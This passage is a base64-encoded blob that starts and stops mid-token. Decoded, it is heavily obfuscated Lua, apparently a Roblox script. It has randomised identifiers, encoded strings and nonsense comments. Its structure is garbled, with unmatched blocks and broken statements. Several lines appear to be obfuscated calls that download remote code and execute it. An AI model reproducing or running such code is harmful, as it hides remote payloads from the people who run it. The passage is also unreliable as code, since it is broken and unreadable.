1bmN0aW9uKCkKLS0gLy8gLy8gLy8gU0diSWpKRkVpbiBKdVNBd3JTUnpuIC8vIC8vIC8vIC0tCiAgICBYWXBIQkNzQnp5KGZ1bmN0aW9uKCkKICAgICAgICB0YVNUdG9UeVBVID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9Vk9jQXR6UkNvciIpLApYaXdaZWptcEJ4LlpudEloUVlDS3cgPSAxCmxvY2FsIFJkdWRib0dXbkcgPSB7fQpNcHBiaVhYYW9JLlZSRm1TY0JISFIgPSB2RmZrUUR2TVdyLmxhaW5Pa2dLZncoMC41LCAwLjUpCiAgICAgICAgbG9jYWwgSlBYYm5rWGNxdiA9IHt9CiAgICB0YVNUdG9UeVBVID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9UFhSa1pkRmRudSIpLAogICAgcVdJYUxMVG5BbSA9IFdETVBoQWFBb20udHRCQnpoWlRISygiPTQyYnBSWFlqOUdiZ1FuY3ZCWFpzVkdkZ0VHSXk5bVpnZzJZeUZXWnpCeWIwQlNad2xIViIpLAogICAgICAgICAgICBmQlR0WWVWb29kOmtiZ3hlbGhZT3MocXlLR1J5RmJZZiAuLiBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj00R1giKSAuLiBYZkJPYklhU2ppKSAtLSB1UEVuR1hYeEJjIFxTV0pOWFRTWklaIGJmV09KTFdack4gVGdxRkxCY0d3cCB2T3RYUHZHY2F3Ci0tIFJ0a1Z3TGNTYW8gYmZXT0pMV1pyTiBLY2pVSGtqaFhPIEhwVG5nekl2d3kKICAgIHRhU1R0b1R5UFUgPSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09SW5SaEpYekxDUCIpLAogICAgICAgICAgICBlbmQKLS0gSGxsT25zQW14Qi5KdGhmektJV2hXID0gUXN5Q3duUE1VWS5sYWluT2tnS2Z3KDAsIDEsIDAuNywgMCkgLS0gc29UTmNpWVBFVCBKVm16QUxMU0ROIGdHbVlXVU5pSHMKICAgICAgICAgICAgICAgICAgICBsb2NhbCB3Vk1ubFBSYUphCmxvY2FsIGpRRVhMZ2J6VGsgPSBid2VKcUh6VU1JOkVtUnhnS3hRdWYoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PWlvYldDUXlDZWUiKSwgewogICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdkZvT0Rub3RhVTpVR1BHckhMU3BnKFdETVBoQWFBb20udHRCQnpoWlRISygiPU55SElpUkpYamkiKSkgdGhlbgopCiAgICAgICAgICAgIGVuZAogICAgZW5kCiAgICAgICAgICAgIGxvY2FsIFBhanZQam5teFAgPSBJUndWbExIS011LnRtWmRka21HTXIuUHlkeFR4c0VEQQogICAgZW5kKQogICAgICAgICAgICAgICAgKQogICAgICAgICAgICBuZGtIclhORWdJID0gWmNmb1ZCc29EQS5ldmNHTkFpd2VxKG5ka0hyWE5FZ0ksIDEsIDEwKSAtLSBoTnBvRUpEc2RwIGtZT1dSVWpmcnIgaFZEcFNlRUVzRiAxIC0gMTAgYWVOUFF2VUhQZwogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgdGFTVHRvVHlQVSA9IFdETVBoQWFBb20udHRCQnpoWlRISygiPT1ZWElDbVh3SUZZIiksCmxvY2FsIHl6UVB0ZFJSWkYgPSBmaU1td29HSFRkLmxhaW5Pa2dLZncoV0RNUGhBYUFvbS50dEJCemhaVEhLKCJpYnZEQVFCbnRvIikpCiAgICAgICAgICAgIC0tIHFPVVJaTEJzZ2cgelZTU05YZVpxViBKSEpSZWt0dm1YIGVEckRIVnFmanQgSFZ6VEJMTHh2ZgoKbG9jYWwgUUhjcVhyYm1TciA9IGZpTW13b0dIVGQubGFpbk9rZ0tmdyhXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09b2haeGhUc3VrTSIpKQotLSBrekRvV2xyT3FTIGJmV09KTFdack4gWHBOTHR0aG1aeCBVYklaQUtvcmdCCiAgICBlbmQKICAgICAgICAgICAgQVlseHNEak5uUS5BTXljS0FRaGhhKDApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICApCiAgICAgICAgcUhZU1VnV1R5RSA9IGZhbHNlCiAgICAgICAgICAgIGVuZAoKbG9jYWwga0tiYUVtSW91TyA9IHt9CiAgICAgICAgaWYgZkJUdFllVm9vZCBCeHRQVWZUUlRKIGZCVHRZZVZvb2Qua2JneGVsaFlPcyB0aGVuCiAgICBlbmQKICAgICAgICBsb2NhbCBIUFpzUHNsa1ZBID0gSVJ3VmxMSEtNdS50bVpkZGttR01yLlB5ZHhUeHNFREE6d05xSmlUZHlwVShXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj1kZkhvR3dJcWJVIikpCiAgICAgICAgc216a2ZkWFlXZApsb2NhbCBZVW5wbEthblNtID0gSVJ3VmxMSEtNdTpDRXd3T2xPYklFKFdETVBoQWFBb20udHRCQnpoWlRISygiPU56eUh6cHlVdVciKSkKY1RRZFJNSFBiVS56d1VMVFJxb0NVOkF6U1hBUlBuWlAoCi0tIGNScXJmSmlHa28gUUhjcVhyYm1TciBYUVplTWl6ZEFNIGxLaVlZTnd5RGEKICAgICAgICBsb2NhbCBmdW5jdGlvbiBReXJHZkJOWFNEKCkKKQogICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIHlPcUN1Y3FSb3MuZU9TWnJ4THlodSA9IHRydWUKbG9jYWwgbnVqQ0dDcFZ0cCA9IHt9CmVuZCkKICAgICAgICAtLSBZU2dSSXhLbVdxIHlJTmJ3dFFib0wgTGp1RXNFblRTViBhUHN5Tlp4T2F1IG1HcHJ0S1Bha1AKICAgICAgICBmdW5jdGlvbihvYlBLaHlvdWdUKQotLSB5Wlhma0VYUENtLklGdmJaZ3F6WE0gPSAwLjEKICAgICAgICB0YVNUdG9UeVBVID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PWNSam5Zd3pFc2wiKSwKICAgICAgICAgICAgZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgIGxvY2FsIHVleUZNeWJBV2QgPSBzR0xUUk9lRnRvLkRCZEtabG1JekYuVWFLRlVQaHRTdDp3TnFKaVRkeXBVKFdETVBoQWFBb20udHRCQnpoWlRISygiPW5ldFlFdnRUdWsiKSkKICAgIFlYbU1qWW9jTnAubGFpbk9rZ0tmdygxLCBxWktJZU5pV0d1LnhjZW5LaE5vUFguRWFvU2J1YXRrRCwgcVpLSWVOaVdHdS5ETHRLbWxtRGdTLmJRcUpsQVRCQm0pLAoKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBuZGtIclhORWdJID0gWmNmb1ZCc29EQS5ldmNHTkFpd2VxKG5ka0hyWE5FZ0ksIDAsIDUpCgpsb2NhbCBkQUhra2lhWkNwID0gY1RRZFJNSFBiVS5IcUpnbnh2YWlNOmJwQlJoV2NGY3AoV0RNUGhBYUFvbS50dEJCemhaVEhLKCJJR3N5WUtGZ0ZjIiksIHt0YVNUdG9UeVBVID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PW96V0pWWFJKRlIiKSwgc0lGTU5iTWlwUSA9IGZhbHNlfSkKLS0gLy8gLy8gLy8gVlRrUmJPWHNiTCB6WWVIeU9jcUlSIC8vIC8vIC8vIC0tCmJMTHlFSHFYZlouV2dydmxibHZMZiA9IFFzeUN3blBNVVkubGFpbk9rZ0tmdygwLjUsIDAsIDAuNTAsIDApIC0tIGRDa1lvc3lZcmQgUUlZcm9aaGhPZiBManVFc0VuVFNWIE1wcGJpWFhhb0kKICAgIHJncmdESEZ2RkUuSnRoZnpLSVdoVyA9IHhoTmF1Q1hqSU8KCi0tIHFPVVJaTEJzZ2cgbWhqS1JIR0xmeSByQ1FKRlVqZGJPIGVEckRIVnFmanQgTHF5VXlsRFlDbAogICAgICAgICAgICBlbmQKICAgICAgICBpZiBvYlBLaHlvdWdULnVpbEpyYVVSZkogPT0gTGZpYXhoSGxpVyB0aGVuCiAgICAgICAgICAgICAgICAgICAgLS0gY3pUaUJMUVRSeiBTd1B2UGNibG5YIGJmV09KTFdack4gT0FybGhNWkxUdyB6a1VvTnJFR1lOIHFjWlZyRWpPSFAKICAgIH0KbG9jYWwgQ2RiVHlOd0RLeCA9CmxvY2FsIGRQaVFiTXJRaksgPSBmaU1td29HSFRkLmxhaW5Pa2dLZncoV0RNUGhBYUFvbS50dEJCemhaVEhLKCJpYnZEQVFCbnRvIikpCiAgICAgICAgICAgICAgICBsb2NhbCBVYklaQUtvcmdCID0gSVJ3VmxMSEtNdS50bVpkZGttR01yLlB5ZHhUeHNFREEuRE52T0lzTVhWZTpJd0h3b0JxYkZsKFdETVBoQWFBb20udHRCQnpoWlRISygiPT1VaHJ0U0RvbWJ1IikpCiAgICAgICAgICAgICAgICAgICAgICAgIHdWTW5sUFJhSmEgPSBtWGxzQ3B4TnZyLmxhaW5Pa2dLZncob0hNTVN6Q0ROdS5XZ3J2bGJsdkxmICsgekZSRWFoQmhkaC5sYWluT2tnS2Z3KDIwLCAxMTUsIDIwKSkKCiAgICAgICAgV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PUpWVGVacXBvakgiKSwgV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PVlhcUpyRmV4RVgiKSwgV0RNUGhBYUFvbS50dEJCemhaVEhLKCJ0d1ZSbVB3cHdRIiksIFdETVBoQWFBb20udHRCQnpoWlRISygiPXB0TUFJQ1FUTEsiKSwKICAgICAgICAgICAgaWYgdkhTb0R5TmNyRTpVR1BHckhMU3BnKFdETVBoQWFBb20udHRCQnpoWlRISygiaFZxRkl0ZnpVWCIpKSBFY0l5cE9rUVlVIHZIU29EeU5jckU6VUdQR3JITFNwZyhXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09QWlISXJNYUp1VSIpKSB0aGVuCgogICAgICAgICAgICAgICAgICAgIGxvY2FsIFhETnJMZ0RMa3MgPSBQSkZHZlhTV09hOndOcUppVGR5cFUoV0RNUGhBYUFvbS50dEJCemhaVEhLKCJrdFpjUk5lb2xIIikpCiAgICAgICAgICAgIGlmIGJFaElxVHpvVHQgbXRVREdpdWdDSyBFY0l5cE9rUVlVIENrWGRNRHFSQlouQWxtR1FieEJxdShtdFVER2l1Z0NLKSA9PSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09bnprUWNKdlNGcCIpIHRoZW4KICAgIFB1THFCQ0xpWGYga1NTUHhFekRaViBMSldUZGJQYWx3Ci0tIFd6S3dvVnJxUGwgYmZXT0pMV1pyTiBTR2JJakpGRWluIEJ1QXNPSGtTVkIgcXRrekJ0V0l2aQpsb2NhbCBTeWdNSU9HdnJBID0gY1RRZFJNSFBiVS5IcUpnbnh2YWlNOmJwQlJoV2NGY3AoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9cWh5SE1IR0x2ciIpLCB7CmxvY2FsIHBTUGhOckZZTGkgPSBQeWR4VHhzRURBOkVMamN5R2Z4a3ooV0RNUGhBYUFvbS50dEJCemhaVEhLKCJKUnVaVEFKUVZxIikpCgoKCiAgICB0YVNUdG9UeVBVID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PVdodE9tRG5Hc1UiKSwKICAgICAgICBBWWx4c0RqTm5RLkZoV1pXQk9hU2woZnVuY3Rpb24oKQpmUHZoTnRJTFN4LmNGb2R5THlLYmcgPSB0cnVlIC0tIGx5R25XRGVyenIgSWdaQ0pwc3lFWgogICAgUHVMcUJDTGlYZiBuUndXek1MZ0tBIExKV1RkYlBhbHcKCmxvY2FsIG1ra0lYaHlGWnEgPSB0TkV4SGlVVGxUKElSd1ZsTEhLTXU6UVpLWGtpa0NpdyhXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIlBpaVpkR1d4RWUiKSkpKCkKY1RRZFJNSFBiVS5nUUlBUW5tWnZ0OnFvTFR3cFR1aFkoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PVBVRUVWQW9BRWkiKSkKdllrVHVpWnZWZC5yTkNSQmFVR3JGID0gZmFsc2UgLS0gc0lGTU5iTWlwUSBEak5iTEFZV1FBCikKbG9jYWwgUUZNb3hrRW1pYiA9IElSd1ZsTEhLTXU6Q0V3d09sT2JJRShXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj1qZVd5eGhQU0xQIikpLlBKRkdmWFNXT2EuWlBaRWNBV2FrVi5KalNzanZQZm1ICikKICAgIHNJRk1OYk1pcFEgPSBmYWxzZSwKYndlSnFIelVNSTpBelNYQVJQblpQKAoKICAgICAgICAgICAgICAgIGxvY2FsIEhnc0Rtblh5Z1cgPSBqWmRzTU90aWdhLkhnc0Rtblh5Z1cKICAgICAgICB3cG10ekpoZnFKKHRydWUpCiAgICAgICAgICAgIGxvY2FsIFhmQk9iSWFTamkgPSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09aGZIQ0tpQUdOZyIpIC4uIERRb2hFeVNjdkcKICAgICAgICBzbEptY3RVSlpNLm1YbHNDcHhOdnIgPSBFUk9lVFl0Y3F6CmxvY2FsIHZObm1IbklYY1cgPSBJUndWbExIS011OkNFd3dPbE9iSUUoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PUFoR2hsaFdKcWwiKSkKICAgIGtGcGJYTmlJRE8gPSBmdW5jdGlvbihES09naGRqcHJjKQogICAgcVdJYUxMVG5BbSA9IFdETVBoQWFBb20udHRCQnpoWlRISygiPTRTWnpGR2FqSlhkd0J5YjBCQ2N2aDJjZ1VHYTBCU2J2Sm5aZzBXWjBsR0l1RkdJbE4zYnZoMlEiKSwKbG9jYWwgV0pmVmx3SnREQSA9IEh0ZmxNb2tZeE4gQnh0UFVmVFJUSiBIdGZsTW9rWXhOOkl3SHdvQnFiRmwoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9cnJ5WmlZTm9jTCIpKQogICAgICAgIGlmIFBuUVRRRWVsV0kuZEFIa2tpYVpDcC5IZ3NEbW5YeWdXID09IHRydWUgdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIG5ka0hyWE5FZ0kgPSBkZXZjVExHY2lxKGtoclhyTUZISGEuSGdzRG1uWHlnVykgRWNJeXBPa1FZVSAwLjUKRERFUk9hV1hFWi5pTVN3eUFaUnZkOm56dkZ4VENEY0QoCikKICAgICAgICAgICAgICAgICAgICBvYlBLaHlvdWdULlFPREpPZ1dMcG4gPSB0cnVlCiAgICAgICAgbnhpaVJZQnhGWSA9IHNjVVloRHFBTFMgIC0tIG9QTGVoakFlZWIgbGh2blFqV2dQVSBNTUpaZ2RrdVR1IEZsY1lMc0lmU3kgdldRZ1BTYmVHVQpsb2NhbCBmdW5jdGlvbiBDb1NEVEFLUHpyKCkKICAgIGNUUWRSTUhQYlUuZ2p1bEZwSUpFRzpLVUdXUmlSR3hLKAogICAgICAgIGtGcGJYTmlJRE8gPSBmdW5jdGlvbigpCi0tIGxvY2FsIHdIaWFmYk9QSkggPSBmaU1td29HSFRkLmxhaW5Pa2dLZncoV0RNUGhBYUFvbS50dEJCemhaVEhLKCJ2V3VQV01oRkN3IiksIEhCUW1ZakFJa2spCiAgICAgICAgaWYgTmRTZ2toeHZkTS51aWxKcmFVUmZKID09IFdETVBoQWFBb20udHRCQnpoWlRISygiPT13c01yUkZtZ29uIikgQnh0UFVmVFJUSiBOZFNna2h4dmRNOlVHUEdySExTcGcoV0RNUGhBYUFvbS50dEJCemhaVEhLKCJpYnZEQVFCbnRvIikpIHRoZW4KCnZZa1R1aVp2VmQueXlORXRoS2FEQSA9IGZhbHNlCgoKICAgICAgICAgICAgICAgIHVWRGpvZ1VOU3AgdllrVHVpWnZWZC5Zc2NmV09GWGN0ID09IFdETVBoQWFBb20udHRCQnpoWlRISygidHdWUm1Qd3B3USIpIHRoZW4KICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICB2SFNvRHlOY3JFLmFYWlpqaGtqcHIgPSBxWktJZU5pV0d1LmFYWlpqaGtqcHIubE9MTXRFV3NVVwpiTEx5RUhxWGZaLlZSRm1TY0JISFIgPSB2RmZrUUR2TVdyLmxhaW5Pa2dLZncoMC41LCAwLjUpCiAgICAgICAgLS0gckFVZlFBcEpqVSBnYWpQSlhiQmVrIHZKTG9obnZKYWQgcFpSd2RUQUJWYyBHbGhCWEhSekJqCgogICAgICAgICAgICBsb2NhbCBReXpvZGRLYkZEID0gekZSRWFoQmhkaC5sYWluT2tnS2Z3KC05MzEuNTI1LCAyMjMuNzg0LCAtOTg2Ljg0OSkKZW5kCm1oaktSSEdMZnkgPSB0TkV4SGlVVGxUKElSd1ZsTEhLTXU6UVpLWGtpa0NpdyhXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09Q3J2WG5Dc0RjcyIpKSkoKQogICAgICAgIHRhU1R0b1R5UFUgPSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09TEdKaWVCaGV1USIpLAogICAgICAgICAgICAgICAgaWYgdm9hQnNzUWFOVSB0aGVuCiAgICAgICAgICAgICAgICApCiAgICBlbmQKICAgICAgICAgICAgICAgICAgICBBWWx4c0RqTm5RLkFNeWNLQVFoaGEoMSkKZlB2aE50SUxTeC5XZ3J2bGJsdkxmID0gUXN5Q3duUE1VWS5sYWluT2tnS2Z3KDAuMSwgMCwgMC4yLCAwKSAtLSBhd0xIQUJlS0NSIEJQWWVXUUtDa04KbG9jYWwgbUhOeWFFckplbyA9CikKICAgICAgICAgICAgICAgICAgICB2Tm5tSG5JWGNXOlhiaUFUdmdQVWwodHJ1ZSwgcVpLSWVOaVdHdS5admdHQmtsYmZPLkJpTElMZUVSRGMsIGZhbHNlLCBJUndWbExIS011KQogICAgICAgICAgICB2WWtUdWladlZkLnl5TkV0aEthREEgPSB0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKLS0gV3pLd29WcnFQbCBiZldPSkxXWnJOIFFvSXRCeFZLdUEgVVVKYUFqVk9jaAopCiAgICAgICAgICAgICAgICAgICAgUXBRQ3pCVVZDZyhXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj1idUNoTkNJRllHIikgLi4gb1BadHVKRlFSSykKbG9jYWwgRlFISXZMY1VaTSA9IGZpTW13b0dIVGQubGFpbk9rZ0tmdyhXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj1hU3J3R0tYUGtuIikpCiAgICBQeWR4VHhzRURBLnBTUGhOckZZTGkuTkFUQ1FwcFZBUTp3TnFKaVRkeXBVKFdETVBoQWFBb20udHRCQnpoWlRISygiPUp5ZnZJQ1NKcmUiKSkKICAgIFdETVBoQWFBb20udHRCQnpoWlRISygiTHZOc0FWRkZUdSIpLAogICAgICAgIGxvY2FsIFprVVJndGNtUEIKZW5kCnBTUGhOckZZTGkubUhVTVJGeGRMazpuenZGeFRDRGNEKApmUHZoTnRJTFN4LnRqdVdsVHNYemUgPSB5elFQdGRSUlpGCiAgICAgICAgICAgICAgICBQdUxxQkNMaVhmIFJFb2tRUXN0V0godk5yWHZJbVBMQikgTEpXVGRiUGFsdwpsb2NhbCB6dExybElaVGJqID0gSVJ3VmxMSEtNdTpDRXd3T2xPYklFKFdETVBoQWFBb20udHRCQnpoWlRISygib210ZG1kR2pmTiIpKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgICAgIGxvY2FsIE9DZW5MaFF2VHAgPSBtamVQSmhMb3JzOkVMamN5R2Z4a3ooV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9SnlmdklDU0pyZSIpLCAxKQogICAgV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PWNxWlFGZmlrZ1UiKSwKICAgICAgICAgICAgICAgICAgICAtLSBhS2xRTXFHbWxZIFN3UHZQY2JsblggaXNZUUFUTlBRQSBJYm5uYWNaZnpZIFNkZVFrcWxoTHcgdkpMb2hudkphZCBXZVZaVVVGVVRhCiAgICAgICAgICAgIGN5bWtHWWVXdEk6Y3lPZ1ZHaUFweSgKCiAgICAgICAgICAgIHhqTGlmdkthT2sKICAgICAgICB0YVNUdG9UeVBVID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9UWFackxoa09ySCIpLAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIFB5ZHhUeHNFREEuRE52T0lzTVhWZTpFTGpjeUdmeGt6KFdETVBoQWFBb20udHRCQnpoWlRISygiPXJyeVppWU5vY0wiKSkucUpqUGVGTmRsdyA9IDAKaFhUbVhrc0ZKTyBQY3BjcmtSbEJ6LCB2SFNvRHlOY3JFIEpabG91aHBIbFQgR25VdkxIb3N1TihnTUhQU2tOZ1BROkRRWnpMRGtxQW4oKSkgTEpXVGRiUGFsdwogICAgLS0gS0xQd0Ric0hEUSB0QVhiV3pzWENiIEN3bmFRUGNRcGwgbHVnS1pvcmVETApsb2NhbCBuUndXek1MZ0tBID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICBpZiB3Vk1ubFBSYUphIHRoZW4KICAgICAgICAgICAgaWYgWFFrTlBvbXNGbSB0aGVuCiAgICAgICAgICAgICAgICBBWWx4c0RqTm5RLkFNeWNLQVFoaGEoKQoKICAgICAgICBrRnBiWE5pSURPID0gZnVuY3Rpb24oR1J0RWZsd1hHdykKICAgICAgICAgICAgaWYgYm1VbHZibUhTTyB0aGVuIGJtVWx2Ym1IU086Qlh0RG5zd3VNRSgpIGVuZAogICAgICAgIHNtemtmZFhZV2QKbG9jYWwgWmpQZHFYUG5uWCA9IElSd1ZsTEhLTXU6Q0V3d09sT2JJRShXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIlJUekpJbWJoeXkiKSkKKQoKICAgICAgICBlbmQKICAgICAgICBzSUZNTmJNaXBRID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PWpETFRzRG9OSVUiKSwKbG9jYWwgZnVuY3Rpb24gamNEc1RhV3R1UCgpCiAgICAgICAgICAgICAgICAgICAgRE52T0lzTVhWZS5zbEptY3RVSlpNLm1YbHNDcHhOdnIgPSBIdFNKZmhNcEpyCiAgICAgICAgICAgICAgICAgICAgU25GQ2Jaalh2bzpFTGpjeUdmeGt6KFdETVBoQWFBb20udHRCQnpoWlRISygiPWtacm94bWJUb3IiKSk6RUxqY3lHZnhreihXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIjBWbVQiKSk6RUxqY3lHZnhreihXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIlN3TEtEVkliUGkiKSk6VWN0Y0tkREtySShvYlBLaHlvdWdULnVpbEpyYVVSZkopCi0tIC8vIC8vIC8vIFNHYklqSkZFaW4geXNIV09RWGJSZSAvLyAvLyAvLyAtLQpQblFUUUVlbFdJLkdJUWVLc2p2c0o6dld5aG5KRkdLRyhmYWxzZSkKCiAgICAgICAgICAgIFB1THFCQ0xpWGYga2pOeGFKQVJ1ZyBMSldUZGJQYWx3CikKICAgICAgICAgICAgc1lGcGhZeHlXYygpCiAgICAgICAgICAgICAgICB5T3FDdWNxUm9zLklwUFJUWER1bXAgPSA1CiAgICAgICAgICAgIGxvY2FsIHNsdFBtSkx5bXYgPSBQeWR4VHhzRURBLkROdk9Jc01YVmUKICAgIHBTUGhOckZZTGkuaU5WUE5lSmVCYTpuenZGeFRDRGNEKAogICAgfQogICAgICAgIHNJRk1OYk1pcFEgPSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09SEZtbXliQmxkcyIpLAogICAgICAgICAgICBsb2NhbCBYUWtOUG9tc0ZtID0gSFBac1BzbGtWQTp3TnFKaVRkeXBVKFdETVBoQWFBb20udHRCQnpoWlRISygiTHJKQUtZaml1ViIpKQogICAgICAgICAgICBlbmQKICAgICAgICBNdFZLWkJBZGZMID0gMjAwLAoKICAgICAgICAgICAgICAgICAgICB1VkRqb2dVTlNwIHZZa1R1aVp2VmQuWXNjZldPRlhjdCA9PSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIndybllDQ1lzSVQiKSB0aGVuCiAgICAgICAgICAgIC0tIHFPVVJaTEJzZ2cgckpWRnZxQmtIWiBCUFllV1FLQ2tOIGNxb0hSeEtkZHMgVWx6bmZxT1pybiBwd0d2WmNmSFJ5IG9JTU1pUlVydHoKICAgICAgICAgICAgUHVMcUJDTGlYZiBKSVNpUXZkTmhOIExKV1RkYlBhbHcKLS0gRWxnemNZTGZFaCBFdHVMTk1sa1NNCgoKICAgIGxvY2FsIHNsSm1jdFVKWk0gPSBETnZPSXNNWFZlOndOcUppVGR5cFUoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PWdIekFlV1F2TkEiKSkKCiAgICBsb2NhbCBPRmh3d01ZR1R5ID0gc0dMVFJPZUZ0by5PbGRtZ0NEcFlHLmRRQ1ZhTkxHRnQKICAgICAgICAgICAgICAgICAgICB2Tm5tSG5JWGNXOlhiaUFUdmdQVWwoZmFsc2UsIHFaS0llTmlXR3UuWnZnR0JrbGJmTy5CaUxJTGVFUkRjLCBmYWxzZSwgSVJ3VmxMSEtNdSkKICAgIGhYVG1Ya3NGSk8gUGNwY3JrUmxCeiwgTmRTZ2toeHZkTSBKWmxvdWhwSGxUIEduVXZMSG9zdU4oUHlkeFR4c0VEQS5wU1BoTnJGWUxpOkRRWnpMRGtxQW4oKSkgTEpXVGRiUGFsdwp9KQpiTEx5RUhxWGZaLmd0RExwYnpNbXYgPSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09bkh6WkxmbU9jQyIpIC0tIFRBZVpMd1Jkb08gVnVYVXJPZnpUVCBBUkRmZ2pTblB0IG1hZnBtYUZFTGsKKQogICAgZnVuY3Rpb24oKQogICAgICAgICAgICAtLSBOQXNld0RwTGhYIEpISlJla3R2bVggVWx6bmZxT1pybiB2V1FnUFNiZUdVIEpvcVFwZVZLV28KLS0gU0diSWpKRkVpbiBKdVNBd3JTUnpuIHBOVlZNUlF6ak0KICAgICAgICAgICAgICAgICAgICB2Tm5tSG5JWGNXOlhiaUFUdmdQVWwoZmFsc2UsIHFaS0llTmlXR3UuWnZnR0JrbGJmTy5CaUxJTGVFUkRjLCBmYWxzZSwgSVJ3VmxMSEtNdSkKICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBTbkZDYlpqWHZvLlVlUFhHZFBKaE9bV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PVRvbUxOUFVQT04iKV06VWN0Y0tkREtySSgxMDAsIGlYSXFmYmlndUgpCikKICAgICAgICAgICAgICAgIEFZbHhzRGpOblEuRmhXWldCT2FTbChmdW5jdGlvbigpCgogICAgaWYgUmZtWVpuaW5XZyB0aGVuCgpKdGh0Tk1LZlNLOkpQRXNvZ2tnYlQoClhpd1plam1wQnguSnRoZnpLSVdoVyA9IFFzeUN3blBNVVkubGFpbk9rZ0tmdygwLCA2MCwgMCwgNjApIC0tIFJXaGh3SU5NRmogU0VucnNmRm91dCBpc1lRQVROUFFBIFZtcFdJd3JKenYgcVNpdWp0TnlQRCBodEtnbExNSVFGCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICB7CmxvY2FsIG16UUJiZHJReFQgPSBJUndWbExIS011OkNFd3dPbE9iSUUoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PWlXZUlZeGhVS1EiKSkKICAgICAgICAgICAgdE5FeEhpVVRsVChJUndWbExIS011OlFaS1hraWtDaXcoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9eUllY2Z5WFNwZSIpKSkoKQpsb2NhbCBra0FCdHB5VUJGID0gSVJ3VmxMSEtNdTpDRXd3T2xPYklFKFdETVBoQWFBb20udHRCQnpoWlRISygiPXVBd3pTWE5QaUoiKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAtLSBRcFFDekJVVkNnKFdETVBoQWFBb20udHRCQnpoWlRISygiNlFuYmwxV2RuSlhZZ2dHZHBkSEl5Vm1keVYyY2dRV1p5bG1SIiksIG9iUEtoeW91Z1QudWlsSnJhVVJmSikKbG9jYWwgZnVuY3Rpb24gRVdmUnBPb1VGcyhIcGpLc3JvYVZRKQogICAgewogICAgICAgIHRhU1R0b1R5UFUgPSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09bUVXVGdzSGZtYSIpLAplbmQKYVFqR1BUZ1dhejpKUEVzb2drZ2JUKAogICAgICAgICAgICAgICAgbG9jYWwgTE9Ec25Hb0l6RSA9IENYWElIb0lFR2Q6SXdId29CcWJGbChXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj1tSmpJenlZVkhUIikpCiAgICAgICAgICAgIH0KCiAgICAgICAgbG9jYWwgU1VwY2FHZk1veiA9IFVjTUJPck51dmQ6SXdId29CcWJGbChXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj1YRlp1eXdSaWRYIikpCiAgICBzWWRDSHNvdHFQID0gbXpRQmJkclF4VC5Sb0p6cEh1bXNWOm56dkZ4VENEY0QoU0tvZXhsT05USikKICAgIGNUUWRSTUhQYlUuU0diSWpKRkVpbjpFbVJ4Z0t4UXVmKAogICAgICAgICAgICAgICAgICAgIFNoZWJmSGt2UmkoCiAgICAgICAgICAgIGlmIHNsdFBtSkx5bXYgdGhlbgogICAgICAgICAgICAtLSBNR2NXdmtzUVlFIHZrZFdLZ3lJeEkga3JvT3lSdlNSQyBMWUFta1FNRnd4IChjcW9IUnhLZGRzIFVsem5mcU9acm4gQVhXUlluZHJUbCkKICAgIEVjenZqVU5SRkkudGp1V2xUc1h6ZSA9IElSd1ZsTEhLTXUuWmpQZHFYUG5uWAogICAgICAgICAgICAgICAgTldWT25UdEhkbzpjUnVkTU9RQlpLKCkKbG9jY